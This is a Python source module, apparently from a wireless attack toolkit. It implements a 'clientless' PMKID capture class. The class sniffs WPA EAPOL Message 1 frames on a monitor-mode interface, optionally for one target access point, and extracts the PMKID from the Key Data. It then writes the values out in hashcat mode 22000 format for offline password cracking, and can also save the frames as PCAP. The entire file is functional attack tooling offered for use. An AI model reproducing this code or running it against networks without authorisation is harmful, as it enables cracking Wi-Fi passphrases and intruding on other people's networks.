"""
PMKID Clientless Capture
─────────────────────────
Capture PMKID values from EAPOL Message 1 frames without
requiring a client to complete the 4-way handshake.

The PMKID is extracted from the RSN IE in Key Data of
EAPOL Message 1 (first 16 bytes of PMKID field).

Export format: hashcat mode 22000 (WPA*01*PMKID*MAC_AP*MAC_STA*ESSID_HEX)
"""

import os
import time
import struct
import threading

from scapy.all import sniff, raw, wrpcap
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11Elt
from scapy.layers.eap import EAPOL

from .config import log


class PMKIDCapture:
    """
    Capture PMKID from EAPOL Message 1 frames (clientless attack).

    Listens for AP-initiated EAPOL Key frames and extracts the PMKID
    from the RSN IE in the Key Data field. No client association needed.

    Usage:
        cap = PMKIDCapture("wlan0mon", target_bssid="AA:BB:CC:DD:EE:FF")
        cap.start()
        # ... wait for PMKIDs ...
        cap.stop()
        cap.export_pmkid_hashcat("output.22000")
    """

    def __init__(self, interface, target_bssid=None, output_dir="pmkid_captures",
                 callback=None):
        """
        Initialize PMKID capture.

        Args:
            interface: Wireless interface in monitor mode
            target_bssid: Optional BSSID filter (only capture for this AP)
            output_dir: Directory for output files
            callback: Optional callable(bssid, client_mac, pmkid_hex)
                      invoked when a PMKID is captured
        """
        self.interface = interface
        self.target_bssid = target_bssid.lower() if target_bssid else None
        self.output_dir = output_dir
        self.callback = callback
        self.running = False
        self._thread = None
        self._lock = threading.Lock()
        self._pmkids = {}  # (client_mac, bssid) -> {pmkid, essid, frame, timestamp}
        self._essid_cache = {}  # bssid -> essid (from beacon frames)
        self._started_at = None
        os.makedirs(output_dir, exist_ok=True)

    def start(self):
        """Start the PMKID capture thread."""
        if self.running:
            log.warning("PMKIDCapture is already running")
            return

        self.running = True
        self._started_at = time.time()
        self._thread = threading.Thread(
            target=self._sniff_loop,
            daemon=True
        )
        self._thread.start()
        log.info(
            f"PMKIDCapture started on {self.interface}"
            f"{' (target: ' + self.target_bssid + ')' if self.target_bssid else ''}"
        )

    def _sniff_loop(self):
        """Main sniff loop - captures EAPOL and beacon frames."""
        try:
            sniff(
                iface=self.interface,
                prn=self._process_frame,
                store=False,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            if self.running:
                log.error(f"PMKIDCapture sniff error: {e}")

    def _process_frame(self, pkt):
        """Process captured frame - look for beacons and EAPOL Message 1."""
        # Cache ESSID from beacon frames
        if pkt.haslayer(Dot11Beacon):
            self._cache_beacon_essid(pkt)
            return

        # Look for EAPOL frames
        if not pkt.haslayer(EAPOL):
            return

        if not pkt.haslayer(Dot11):
            return

        dot11 = pkt[Dot11]

        # Determine direction - Message 1 is AP to Client (From-DS)
        fc_field = dot11.FCfield if hasattr(dot11, 'FCfield') else 0
        to_ds = fc_field & 0x01
        from_ds = fc_field & 0x02

        if from_ds and not to_ds:
            # AP to Client
            client_mac = dot11.addr1
            bssid = dot11.addr2
        elif to_ds and not from_ds:
            # Client to AP - not Message 1
            return
        else:
            # Fallback
            bssid = dot11.addr3 if dot11.addr3 else dot11.addr1
            client_mac = dot11.addr1

        if not bssid or not client_mac:
            return

        bssid = bssid.lower()
        client_mac = client_mac.lower()

        # Apply target BSSID filter
        if self.target_bssid and bssid != self.target_bssid:
            return

        # Check if this is Message 1 (ACK set, no MIC)
        eapol_data = raw(pkt.getlayer(EAPOL))
        if not self._is_message_1(eapol_data):
            return

        # Extract PMKID from Key Data RSN IE
        pmkid = self._extract_pmkid(eapol_data)
        if not pmkid:
            return

        pmkid_hex = pmkid.hex()

        # Get ESSID from cache
        essid = self._essid_cache.get(bssid, "")

        with self._lock:
            key = (client_mac, bssid)
            self._pmkids[key] = {
                "pmkid": pmkid_hex,
                "essid": essid,
                "frame": pkt,
                "timestamp": time.time()
            }

        log.critical(f"PMKID captured: {bssid} -> {client_mac} [{pmkid_hex[:16]}...]")

        # Invoke callback
        if self.callback:
            try:
                self.callback(bssid, client_mac, pmkid_hex)
            except Exception as e:
                log.error(f"PMKID callback error: {e}")

    def _cache_beacon_essid(self, pkt):
        """Extract and cache ESSID from beacon frame."""
        if not pkt.haslayer(Dot11):
            return

        dot11 = pkt[Dot11]
        bssid = dot11.addr3
        if not bssid:
            return

        bssid = bssid.lower()

        # Extract ESSID from Dot11Elt (Information Element)
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:  # SSID parameter set
                try:
                    essid = elt.info.decode("utf-8", errors="replace")
                    if essid:
                        self._essid_cache[bssid] = essid
                except (AttributeError, UnicodeDecodeError):
                    pass
                break
            elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None

    def _is_message_1(self, eapol_data):
        """Check if EAPOL frame is Message 1 (ACK set, no MIC)."""
        try:
            if len(eapol_data) < 7:
                return False
            key_info = (eapol_data[5] << 8) | eapol_data[6]
            ack = bool(key_info & 0x0080)
            mic = bool(key_info & 0x0100)
            return ack and not mic
        except (IndexError, TypeError):
            return False

    def _extract_pmkid(self, eapol_data):
        """
        Extract PMKID from EAPOL Key Data RSN IE.

        EAPOL-Key structure:
            Bytes 0-3: EAPOL header
            Byte 4: Key Descriptor Type
            Bytes 5-6: Key Information
            Bytes 7-8: Key Length
            Bytes 9-16: Replay Counter (8 bytes)
            Bytes 17-48: Key Nonce (32 bytes)
            Bytes 49-64: Key IV (16 bytes)
            Bytes 65-72: Key RSC (8 bytes)
            Bytes 73-80: Key ID (8 bytes)
            Bytes 81-96: Key MIC (16 bytes)
            Bytes 97-98: Key Data Length (2 bytes)
            Bytes 99+: Key Data (contains RSN IE with PMKID)

        RSN IE PMKID format in Key Data:
            Tag: 0xdd (vendor specific) or 0x14 (PMKID list)
            PMKID is 16 bytes within the RSN PMKID KDE
            KDE format: dd <len> 00:0f:ac:04 <pmkid[16]>
        """
        try:
            if len(eapol_data) < 99:
                return None

            # Key Data Length
            key_data_len = (eapol_data[97] << 8) | eapol_data[98]
            if key_data_len == 0:
                return None

            key_data_start = 99
            key_data = eapol_data[key_data_start:key_data_start + key_data_len]

            if len(key_data) < key_data_len:
                return None

            # Search for PMKID KDE (OUI: 00:0f:ac, Type: 04)
            # Format: dd <length> 00 0f ac 04 <pmkid[16]>
            offset = 0
            while offset < len(key_data) - 2:
                tag = key_data[offset]
                length = key_data[offset + 1]

                if offset + 2 + length > len(key_data):
                    break

                # Check for vendor-specific KDE with PMKID OUI
                if tag == 0xdd and length >= 20:
                    kde_data = key_data[offset + 2:offset + 2 + length]
                    # Check OUI 00:0f:ac type 04 (PMKID)
                    if (len(kde_data) >= 20 and
                            kde_data[0] == 0x00 and
                            kde_data[1] == 0x0f and
                            kde_data[2] == 0xac and
                            kde_data[3] == 0x04):
                        pmkid = kde_data[4:20]
                        # Verify PMKID is not all zeros
                        if pmkid != b"\x00" * 16:
                            return pmkid

                offset += 2 + length

        except (IndexError, TypeError):
            pass

        return None

    def stop(self):
        """Stop the PMKID capture and wait for thread cleanup."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=10)
            self._thread = None
        log.info("PMKIDCapture stopped")

    def get_pmkids(self):
        """Return all captured PMKIDs."""
        with self._lock:
            return dict(self._pmkids)

    def export_pmkid_hashcat(self, filename=None):
        """
        Export captured PMKIDs in hashcat mode 22000 format.

        Format: WPA*01*PMKID*MAC_AP*MAC_STA*ESSID_HEX

        Args:
            filename: Output filename. If None, auto-generated.

        Returns:
            Output filename or None if no PMKIDs captured.
        """
        with self._lock:
            if not self._pmkids:
                return None

            if filename is None:
                filename = os.path.join(
                    self.output_dir,
                    f"pmkid_{int(time.time())}.22000"
                )

            lines = []
            for (client_mac, bssid), data in self._pmkids.items():
                pmkid_hex = data["pmkid"]
                mac_ap = bssid.replace(":", "")
                mac_sta = client_mac.replace(":", "")
                essid_hex = data["essid"].encode("utf-8").hex() if data["essid"] else ""

                line = f"WPA*01*{pmkid_hex}*{mac_ap}*{mac_sta}*{essid_hex}"
                lines.append(line)

            with open(filename, "w") as f:
                f.write("\n".join(lines) + "\n")

            log.critical(f"PMKID hashcat file saved: {filename} ({len(lines)} entries)")
            return filename

    def export_pcap(self, filename=None):
        """
        Export captured PMKID frames to PCAP.

        Args:
            filename: Output filename. If None, auto-generated.

        Returns:
            Output filename or None if no PMKIDs captured.
        """
        with self._lock:
            if not self._pmkids:
                return None

            if filename is None:
                filename = os.path.join(
                    self.output_dir,
                    f"pmkid_{int(time.time())}.pcap"
                )

            frames = [data["frame"] for data in self._pmkids.values()]
            wrpcap(filename, frames)
            log.critical(f"PMKID PCAP saved: {filename}")
            return filename

    def get_stats(self):
        """Return capture statistics."""
        with self._lock:
            return {
                "running": self.running,
                "interface": self.interface,
                "target_bssid": self.target_bssid,
                "pmkids_captured": len(self._pmkids),
                "essids_cached": len(self._essid_cache),
                "uptime": time.time() - self._started_at if self._started_at else 0
            }
